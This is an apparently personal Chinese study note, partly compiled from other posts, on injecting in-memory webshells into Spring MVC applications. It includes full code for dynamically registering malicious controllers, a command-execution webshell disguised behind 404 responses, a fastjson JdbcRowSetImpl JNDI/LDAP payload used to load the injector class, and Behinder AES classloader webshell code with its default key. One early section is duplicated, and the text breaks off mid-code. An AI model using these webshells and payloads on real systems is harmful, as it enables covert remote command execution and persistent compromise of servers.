如下图， getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。

注意这里及下面实现方法中的 Root WebApplicationContext 都是后文的一个伏笔。

![img](img/t011b80fe0df23f4ca2.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t011b80fe0df23f4ca2.png?lastModify=1646033842)

**第二种：WebApplicationContextUtils**

```
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 WebApplicationContextUtils的

```
public static WebApplicationContext getWebApplicationContext(ServletContext sc)
```

方法来获取当前上下文环境，其中

WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。

5.1.9中没有 `(RequestContextUtils.getWebApplicationContext`

变为

```
RequestContextUtils.findWebApplicationContext
```

剩余部分代码，都是用来获得 ServletContext 类的一个实例，可以简化为第三种。

**第三种：RequestContextUtils**

```
WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

上面的代码使用 RequestContextUtils 的

![image-20220214123540951](img/image-20220214123540951.png)![image-20220214123540951](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214123540951.png?lastModify=1646033842)

通过 ServletRequest 类的实例来获得 WebApplicationContext 。

如下图，可以发现此方法获得的是一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。这个 dispatcherServlet-servlet 其实是上面配置中 dispatcherServlet-servlet.xml 的文件名。

![img](img/t01ab22f6583f46145a.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t01ab22f6583f46145a.png?lastModify=1646033842)

进一步分析，代码中有个 RequestContextHolder.currentRequestAttributes() ，在前置知识中已经提到过

所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

然后如下图，查看当前所有的 attributes，发现确实保存有 Context 的属性名。

其中 org.springframework.web.servlet.DispatcherServlet.CONTEXT 和 org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE 属性名中都存放着一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext 。

![img](img/t016ca4129bf6e6c8d9.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t016ca4129bf6e6c8d9.png?lastModify=1646033842)

**第四种：getAttribute**

```
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

从方法三的分析来看，其实完全可以将存放在 ServletContext 属性中的 Context 取出来直接使用。在阅读相关源码后发现，上面代码中的 currentRequestAttributes() 替换成 getRequestAttributes() 也同样有效；getAttribute 参数中的 0代表从当前 request 中获取而不是从当前的 session 中获取属性值。

因此，使用以上代码也可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。

## Spring Controller内存马

#### 获取 Context

所有的 `Context` 在创建后，都会被作为一个属性添加到了`ServletContext`。

**第一种：getCurrentWebApplicationContext()**

```
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

如下图， getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。

注意这里及下面实现方法中的 Root WebApplicationContext 都是后文的一个伏笔。

![img](img/t011b80fe0df23f4ca2.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t011b80fe0df23f4ca2.png?lastModify=1646033842)

**第二种：WebApplicationContextUtils**

```
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 WebApplicationContextUtils的

```
public static WebApplicationContext getWebApplicationContext(ServletContext sc)
```

方法来获取当前上下文环境，其中

WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。

5.1.9中没有 `(RequestContextUtils.getWebApplicationContext`

变为

```
RequestContextUtils.findWebApplicationContext
```

剩余部分代码，都是用来获得 ServletContext 类的一个实例，可以简化为第三种。

**第三种：RequestContextUtils**

```
WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

上面的代码使用 RequestContextUtils 的

![image-20220214123540951](img/image-20220214123540951.png)![image-20220214123540951](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214123540951.png?lastModify=1646033842)

通过 ServletRequest 类的实例来获得 WebApplicationContext 。

如下图，可以发现此方法获得的是一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。这个 dispatcherServlet-servlet 其实是上面配置中 dispatcherServlet-servlet.xml 的文件名。

![img](img/t01ab22f6583f46145a.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t01ab22f6583f46145a.png?lastModify=1646033842)

进一步分析，代码中有个 RequestContextHolder.currentRequestAttributes() ，在前置知识中已经提到过

所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

然后如下图，查看当前所有的 attributes，发现确实保存有 Context 的属性名。

其中 org.springframework.web.servlet.DispatcherServlet.CONTEXT 和 org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE 属性名中都存放着一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext 。

![img](img/t016ca4129bf6e6c8d9.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/t016ca4129bf6e6c8d9.png?lastModify=1646033842)

**第四种：getAttribute**

```
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

从方法三的分析来看，其实完全可以将存放在 ServletContext 属性中的 Context 取出来直接使用。在阅读相关源码后发现，上面代码中的 currentRequestAttributes() 替换成 getRequestAttributes() 也同样有效；getAttribute 参数中的 0代表从当前 request 中获取而不是从当前的 session 中获取属性值。

因此，使用以上代码也可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。

#### 手动注册 controller

一个正常的 controller 如下，当浏览器访问 /hello 路径时，会在定义好的 View 输出  `hello spring mvc`

```
package com.test.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class Hello1Controller {
    @RequestMapping("/hello")
    public String hello(Model model){
        model.addAttribute("msg","hello spring mvc");
        return "hello1";
    }
}
```

Spring 2.5 开始到 Spring 3.1 之前一般使用 `org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping` 映射器 ；

Spring 3.1 开始及以后一般开始使用新的 `org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping` 映射器来支持@Contoller和@RequestMapping注解。

当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文一般存在其中一种映射器的实例 bean。又因版本不用和较多的接口等原因，手工注册动态 controller 的方法不只一种。

#### 方法一 registerMapping

在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requesuMapping，这是最直接的一种方式

```
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("me.landgrey.SSOLogin").newInstance(), method);
```

#### 方法二 registerHandler

参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类

```
org.springframework.web.servlet.handler.AbstractUrlHandlerMapping
```

进入查看代码，发现其中有一个registerHandler 方法，摘录关键部分如下：

```
protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
    ...
    Object resolvedHandler = handler;
    if (!this.lazyInitHandlers && handler instanceof String) {
        String handlerName = (String)handler;
        if (this.getApplicationContext().isSingleton(handlerName)) {
            resolvedHandler = this.getApplicationContext().getBean(handlerName);
        }
    }
    Object mappedHandler = this.handlerMap.get(urlPath);
    if (mappedHandler != null) {
        if (mappedHandler != resolvedHandler) {
            throw new IllegalStateException("Cannot map " + this.getHandlerDescription(handler) + " to URL path [" + urlPath + "]: There is already " + this.getHandlerDescription(mappedHandler) + " mapped.");
    ...
    } else {
        this.handlerMap.put(urlPath, resolvedHandler);
        if (this.logger.isInfoEnabled()) {
            this.logger.info("Mapped URL path [" + urlPath + "] onto " + this.getHandlerDescription(handler));
        }
    }
}
```

该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。

相关示例代码和解释如下：

```
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

#### 方法三 detectHandlerMethod

参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类

```
org.springframework.web.servlet.handler.AbstractHandlerMethodMapping
```

进入查看代码，发现其中有一个detectHandlerMethods 方法，代码如下：

```
protected void detectHandlerMethods(Object handler) {
    Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
    final Class<?> userType = ClassUtils.getUserClass(handlerType);
    Set<Method> methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {
        public boolean matches(Method method) {
            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;
        }
    });
    Iterator var6 = methods.iterator();
    while(var6.hasNext()) {
        Method method = (Method)var6.next();
        T mapping = this.getMappingForMethod(method, userType);
        this.registerHandlerMethod(handler, method, mapping);
    }
}
```

该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。

示例代码如下：

```
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```

#### controller 中的 webshell 逻辑

在使用 registerMapping 动态注册 controller 时，不需要强制使用 [@RequestMapping](https://github.com/RequestMapping) 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用[@RequestMapping](https://github.com/RequestMapping) 注解 。

除此之外，将 Webshell 的代码逻辑写在主要的 Controller 方法中即可。

下面提供一个简单的用来执行命令回显的 Webshell 代码示例：

```
package me.landgrey;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

@Controller
public class SSOLogin {

    @RequestMapping(value = "/favicon")
    public void login(HttpServletRequest request, HttpServletResponse response){
        try {
            String arg0 = request.getParameter("code");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                response.sendError(404);
            }
        }catch (Exception e){
        }
    }
}
```

代码比较简单，达到的效果是，当请求没有携带指定的参数(code)时，返回 404 错误，当没有经验的人员检查时，因为 Webshell 仅存在于内存中，直接访问又是 404 状态码，所以很可能会认为 Webshell 不存在或者没有异常了。

#### 注意事项

不同的映射处理器

如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。

```
<bean class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" />
<bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter" />
```

上文展示的四种获得当前代码运行时的上下文环境的方法中，推荐使用后面两种方法获得 Child WebApplicationContext。

这是因为：根据习惯，在很多应用配置中注册Controller 的 component-scan 组件都配置在类似的 dispatcherServlet-servlet.xml 中，而不是全局配置文件 applicationContext.xml 中。

这样就导致 RequestMappingHandlerMapping 的实例 bean 只存在于 Child WebApplicationContext 环境中，而不是 Root WebApplicationContext 中。上文也提到过，Root Context无法访问Child Context中定义的 bean，所以可能会导致 Root WebApplicationContext 获得不了 RequestMappingHandlerMapping 的实例 bean 的情况。

另外，在有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件，这时候通过前两种方法是获取不到Root WebApplicationContext的。

> 既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的代码执行漏洞才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。

来自： https://www.anquanke.com/post/id/198886

## spring mvc controller内存马

#### fastjson反序列化和JNDI

fastjson1.24版本

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.x.x:1389/Exploit","autoCommit":true}
```

当web端使用fastjson对上面的json进行反序列化时，受到`@type`注解的指示，会通过反射创建`com.sun.rowset.JdbcRowSetImpl`类的对象，基于fastjson的机制web端还会自动调用这个对象内部的set方法，最后触发JdbcRowSetImpl类中的特定set方法，访问dataSourceName指定的服务端，并下载执行服务端指定的class文件。

#### 向Spring mvc 注入 controller

spring版本4.2.6.RELEASE

普通的controller写法

![img](img/1575162-20210528094511265-926147630.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1575162-20210528094511265-926147630.png?lastModify=1646033842)

通过@RequestMapping注解标明url和请求方法，编译部署后，spring会根据这个注解注册好相应的controller。动态注入controller的核心步骤如下

```
public class InjectToController{
    public InjectToController() throws Exception {
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method2 = InjectToController.class.getMethod("test");
        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/malicious");
        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        InjectToController injectToController = new InjectToController();
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }
    public void test() {
        xxx
    }
}
```

- 步骤1中的context为web端处理这个请求时，当前线程内所拥有的各种环境信息和资源
- 步骤2中获取的 mappingHandlerMapping 对象是用于注册 controller的
- 步骤3中的反射是为了获得 test 这个 Method 对象，以便动态注册 controller 时，告知接收到给定 url 路径的请求后，用哪个Method 来处理，其中InjectToController类就是我们的恶意类
- 步骤4中的 url 对象是为了指定注入 url，即 内存马路径
- 步骤5是告知注入的 url 允许的请求方法
- 步骤6中 RequestMappingInfo 填入的信息类似于 @RequestMapping注解中的信息，即 url、允许的请求方法等。是真正注册 controller 的步骤。
- InjectToController这个类就是我们的恶意类，其中定义了test方法，这个方法内存在执行命令，当然也可以替换成冰蝎、哥斯拉的webshell核心代码，以便使用这两个工具。InjectToController的完整代码在后面的章节可见

#### 获取request和response

jsp 一句话

```
java.lang.Runtime.getRuntime().exec(request.getParameters("cmd"));
```

由于 jsp 文件被执行时，或自动获得了这个 request 这个资源，所以一句话木马不需要考虑如何获取 request 这个对象。但在我们注入 controller 的流程中，恶意 java 类的编译是由攻击者完成的，web段直接执行编译好的 class 文件，显然不可能像上面图片中用注解的方式在让test方法(InjectToController中的)的参数自带request，

看这： https://www.jianshu.com/p/89b0a7c11ee2 ，通过spring的内部方法获取到request和response对象

```
HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();

HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();  
```

如果 spring mvc 项目部署在 tomcat 下，也可以用针对 tomcat 获取 request 的方法，例如从ThreadLocal、Mbean和Thread.getCurrentThread获取(后方参考文献中已给出)

#### 阻止重复添加controller(非必须)

经过调试发现，上面获取的mappingHandlerMapping中有一个mappingRegistry成员对象，而该对象下的urlLookup属性保存了已经注册的所有url路径，对mappingHandlerMapping进一步后发现，以上对象和属性都是私有的，且mappingRegistry并非mappingHandlerMapping中创建的，而是来自于基类AbstractHandlerMethodMapping。

![img](img/1575162-20210528094528901-1077690602.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1575162-20210528094528901-1077690602.png?lastModify=1646033842)

所以对AbstractHandlerMethodMapping的源码进行了一番查看，发现通过其getMappingRegistry方法可以获取mappingRegistry，而urlLookup是其内部类MappingRegistry的私有属性，可以通过反射获取。

![img](img/1575162-20210528094737008-669660347.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1575162-20210528094737008-669660347.png?lastModify=1646033842)

反射获取urlLookup和判断我们给定的url是否被注册的代码块如下

```
// 获取abstractHandlerMethodMapping对象，以便反射调用其getMappingRegistry方法
AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
// 反射调用getMappingRegistry方法
Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
method.setAccessible(true);
Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
// 反射获取urlLookup属性
Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
field.setAccessible(true);
Map urlLookup = (Map) field.get(mappingRegistry);
// 判断我们想要注入的路径是否被已经存在
Iterator urlIterator = urlLookup.keySet().iterator();
List<String> urls = new ArrayList();
while (urlIterator.hasNext()){
    String urlPath = (String) urlIterator.next();
    if ("/malicious".equals(urlPath)){
        System.out.println("url已存在");
        return;
    }
}
```

#### 实验

测试环境：

```
package com.test.controller;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

@RestController
public class Demo {
    @RequestMapping(value = "/postjson",method = RequestMethod.GET)
    public String postjson()  {
        return "postjson";
    }
    @RequestMapping(value = "/readjson",method = RequestMethod.POST)
    public String readjson(HttpServletRequest request){
        String jsonstr = request.getParameter("jsonstr");
        System.out.println(jsonstr);

        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);

        return "readjson";
    }
}
```

`/readjson` 可触发反序列化。

#### 恶意源代码

通过JNDI注入让服务端执行的代码如下

```
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class InjectToController{
    public InjectToController() throws Exception {
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        // 2.5 可选步骤，判断url是否存在
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        List<String> urls = new ArrayList();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if ("/malicious".equals(urlPath)){
                System.out.println("url已存在");
                return;
            }
        }

        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method2 = InjectToController.class.getMethod("test");
        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/malicious");
        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }

    public InjectToController(String aaa){

    }

    // controller 指定的处理方法
    public void test() throws IOException {
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        // 获取cmd参数并执行命令
        java.lang.Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
}
```

- 由于fastjson反序列化时，自动下载并执行编译好的class文件，所以要在构造函数中写入注册controller的步骤
- 反序列化时自动触发的构造函数是第一个构造函数，因为没有带参数
- 由于registerMapping方法注册controller时需要给一个对象和这个对象内部的处理方法，而web端只下载了InjectToController这个类，再来一次JNDI去获取一个恶意类属实麻烦，所以用了`InjectToController injectToController = new InjectToController("aaa");`，这样就会进入第二个构造函数，而不会进入第一个构造函数无限循环。

#### 测试

启动spring mvc项目，访问/项目/malicious路径，返回404

![image-20220214140101723](img/image-20220214140101723.png)![image-20220214140101723](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214140101723.png?lastModify=1646033842)

使用marshalsec开一个ldap的服务，并指定/Exploit这个reference对应的路径为 127.0.0.1/#InjectToController，再用python开一个web文件服务器

编译InjectToController.java，将编译好的class文件放到python开的web文件服务根目录下，并提交payload

payload:

```
jsonstr={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/InjectToController","autoCommit":true}
```

![image-20220214143533704](img/image-20220214143533704.png)![image-20220214143533704](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214143533704.png?lastModify=1646033842)

payload提交后，会被fastjson进行反序列化，在这个过程中会触发JdbcRowSetImpl中的connect函数，并根据给定的dataSourceName发起LDAP请求，从开启的给定的LDAP服务端(1389端口)获得恶意类的地址，再去下载并执行恶意类(80端口)，可以看到payload攻击成功了

![image-20220214143657298](img/image-20220214143657298.png)![image-20220214143657298](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220214143657298.png?lastModify=1646033842)

#### 注入冰蝎代码

首先来看看冰蝎的shell.jsp文件

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
class U extends ClassLoader{
	U(ClassLoader c){super(c);}  //构造函数

	public Class g(byte []b){
		return super.defineClass(b,0,b.length);  // 调用父类的defineClass函数
	}
}
%>

<%
if (request.getMethod().equals("POST"))
	{
		String k="e45e329feb5d925b";
		session.putValue("u",k);
		Cipher c=Cipher.getInstance("AES");
		c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
		new U(ClassLoader.class.getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
	}
%>
```

可以看出，该 jsp 的核心功能有三点

- 为了方便地使用 defineClass，创建了 U 继承 ClassLoader
- 使用 java 自带的包，解密 AES 加密数据
- 使用 defineClass 加载 AES 解密后字节码，获得一个恶意类，利用 newInstance 创建这个类的实例，并调用 equals 方法

**pageContext**

jsp 中 pageContext 是 jsp 文件在运行过程中自带的对象，可以获取 request/reponse/session 这三个包含页面信息的重要对象，对应 pageContext 有getRequest/getResponse/getSession方法。

但是从冰蝎的作者给出的提示可以知道，冰蝎3.0 bata7之后不在依赖pageContext，见[github issue](https://github.com/rebeyond/Behinder/issues/151)

又从源码确认了一下，在equal函数中传入的object有request/response/session对象即可

![img](img/1575162-20210530000819184-1037266106.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1575162-20210530000819184-1037266106.png?lastModify=1646033842)

所以注入的controller代码中，可以将pageContext换成一个Map，手动添加key和value即可，前面的恶意类源代码中已经给出了如何获取request/response/session

![img](img/1575162-20210530000845636-1017582207.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1575162-20210530000845636-1017582207.png?lastModify=1646033842)

**继承ClassLoader和调用 defineClass**

前面提到继承，当然也可以使用反射，但是这样更方便而已。对恶意类稍加改造，继承ClassLoader、定义新的构造函数、增加g函数、添加冰蝎的服务端代码

```
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.*;

public class InjectToController extends ClassLoader{
    private final String injectUrlPath = "malicious";
    private final String k = "e45e329feb5d925b"; /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/

    public Class g(byte[] b){
        return super.defineClass(b,0,b.length);
    }

    public InjectToController(ClassLoader c){
        super(c);
    }

    public InjectToController() throws Exception {
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        // 2.5 可选步骤，判断url是否存在
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        List<String> urls = new ArrayList();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if ("/malicious".equals(urlPath)){
